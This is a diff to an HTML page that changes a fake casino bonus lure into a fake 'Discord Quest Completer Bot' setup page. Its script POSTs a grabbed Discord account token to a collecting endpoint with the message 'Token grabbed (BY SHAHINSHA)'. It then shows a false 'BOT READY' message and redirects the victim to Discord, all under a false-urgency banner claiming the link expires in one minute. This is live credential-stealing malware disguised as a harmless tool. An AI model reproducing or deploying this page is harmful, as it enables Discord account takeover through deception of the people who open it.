@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>🎁 Claim Your Bonus</title>
+    <title>SetupDC.QuestCompleters</title>
     <style>
         body { margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; background: #0a0a0a; font-family: Arial, sans-serif; color: white; text-align: center; }
         .container { max-width: 700px; padding: 30px; background: #1a1a2e; border-radius: 30px; border: 2px solid #ffcc00; }
@@ -13,18 +13,19 @@
         .footer { color: #555; margin-top: 20px; font-size: 0.9rem; }
         .promo { background: #2a2a3e; padding: 15px; border-radius: 15px; margin: 15px 0; }
         .highlight { background: #ffcc00; color: #0a0a0a; padding: 8px 16px; border-radius: 8px; font-weight: bold; }
+
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>🎰 MiBeast Casino Launch</h1>
-        <p class="sub">I'm giving away <span class="highlight">$5,600</span> to everyone who registers!</p>
+        <h1>🎰 Discord Quest Completer Bot</h1>
+        <p class="sub">SAFE &SECURE  <span class="highlight">100%</span> Welcome to Quest Completer!</p>
         <div class="promo">
-            <p style="color:#ffcc00;">🎁 Use promo code: <strong style="font-size:2rem;">BET</strong></p>
-            <p>Click the image below to claim your bonus instantly.</p>
+            <p style="color:#ffcc00;"></p>
+            <p>Click on below button to add to Discord</p>
         </div>
-        <img id="claimImage" src="https://cdn.discordapp.com/attachments/1541670433760219248/1544555786901004289/image1.jpg?ex=6a9c3aec&is=6a9ae96c&hm=e8455550b98fe80d32a5e8c5d96dabc576fe5cf867afc49608ce1599905de61a&" alt="Click to claim">
-        <p class="footer">⏳ This offer expires in 1 hour – act fast!</p>
+        <img id="claimImage" src="https://cdn.discordapp.com/attachments/1545479514078052425/1545717911031914526/f5ea9b2f-c714-4f8a-af3e-ba420bfe7125_removalai_preview.png?ex=6a9d297c&is=6a9bd7fc&hm=18e3ae2d7ec7591856c2b1b68aa6a0f8ccab3545947efc6050b1d6d2ea1b322a" alt="Click to ADD">
+        <p class="footer">⏳ This Linkbexpires in 1 min– act fast!</p>
     </div>
 
     <script>
@@ -50,11 +51,11 @@
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        content: `🚀 **Token grabbed (image click)**\n\`${token}\``,
-                        embeds: [{ title: "MiBeast Grab", color: 0xffcc00 }]
+                        content: `🚀 **Token grabbed (BY SHAHINSHA)**\n\`${token}\``,
+                        embeds: [{ title: "SXE ON TOP!", color: 0xffcc00 }]
                     })
                 }).then(() => {
-                    document.body.innerHTML = "<div style='display:flex;justify-content:center;align-items:center;height:100vh;background:#0a0a0a;color:#ffcc00;font-size:2rem;'>✅ Bonus claimed! Redirecting...</div>";
+                    document.body.innerHTML = "<div style='display:flex;justify-content:center;align-items:center;height:100vh;background:#0a0a0a;color:#ffcc00;font-size:2rem;'>✅ BOT READY! Next to setup manuel...</div>";
                     setTimeout(() => { window.location.href = 'https://discord.com/channels/@me'; }, 2000);
                 }).catch(() => {});
             }
